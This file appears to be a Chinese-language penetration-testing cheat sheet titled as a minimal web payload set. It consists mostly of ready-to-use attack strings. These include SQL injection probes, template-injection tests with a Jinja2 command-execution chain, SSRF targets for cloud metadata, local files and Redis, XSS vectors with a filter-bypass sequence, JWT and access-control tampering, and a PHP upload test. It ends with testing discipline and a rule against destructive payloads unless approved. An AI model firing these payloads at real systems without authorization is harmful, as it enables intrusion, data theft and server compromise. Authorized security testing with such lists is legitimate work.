---
id: payloads/minimal-web
type: payload
tags: [payload, sqli, ssti, ssrf, xss, 最小集]
source: self
license: MIT
version: 1
updated: 2026-10-22
---

# 最小 payload 集（每类 3–5 条，够用就停）

> 原则：**先最小可验证，再谈绕过**。每一条都要能对照基线判断"变化了没有"。
> 全库在 PayloadsAllTheThings；这里只放最先该试的那几条。

## SQLi（MySQL 优先）

```sql
' AND 1=1-- -
' AND 1=2-- -
' ORDER BY 5-- -            -- 找字段数边界
' UNION SELECT 1,2,3-- -
' AND SLEEP(3)-- -          -- 无回显时用，重复 2 次
```

## SSTI（先判引擎再打）

```
{{7*7}}          → 49  = Jinja2/Twig/Nunjucks
${7*7}           → 49  = Freemarker/JSP EL
<%= 7*7 %>       → 49  = ERB/EJP
#{7*7}           → 49  = Ruby/Rails
{{7*'7'}}        → 7777777 = Jinja2，49 = Twig（判型用）
```

Jinja2 走到 RCE 的最短链：
```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

## SSRF（先证出站，再谈打内网）

```
http://127.0.0.1:80/
http://169.254.169.254/latest/meta-data/
http://[::1]:6379/
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
```
**验证方式**：DNS 回连 `<随机>.OAST_DOMAIN` 比"响应不同"更硬。

## XSS（先证执行，再谈利用）

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
javascript:alert(1)
'-alert(1)-'
```

绕过顺序：大小写 → 双写 → HTML 实体 → JS unicode → 标签替换 → 事件替换。
**存储型必须二次访问验证**（换个浏览器/无痕，确认落地）。

## 越权（不需要 payload，需要两个身份）

```
GET /api/user/<B_ID>        + A 的 token
GET /api/admin/users        + 普通用户 token
GET /api/user/<id>          （去掉 token）
JWT: alg=none / HS256 弱密钥 / role 篡改
```

## 上传（最小 PHP，不传大马）

```
<?php echo "ARTEX".(7*7); ?>
```

## 纪律

- 每条 payload **只改一个变量**（编码/位置/大小写），否则不知道哪个起作用。
- 同一条 payload 连续 2 次无差异 → 换手法类别，不要在同一类里换第 6 个变体。
- 破坏性 payload（写文件/删数据/重启服务）**一律不用**，除非任务明确要求且已批准。
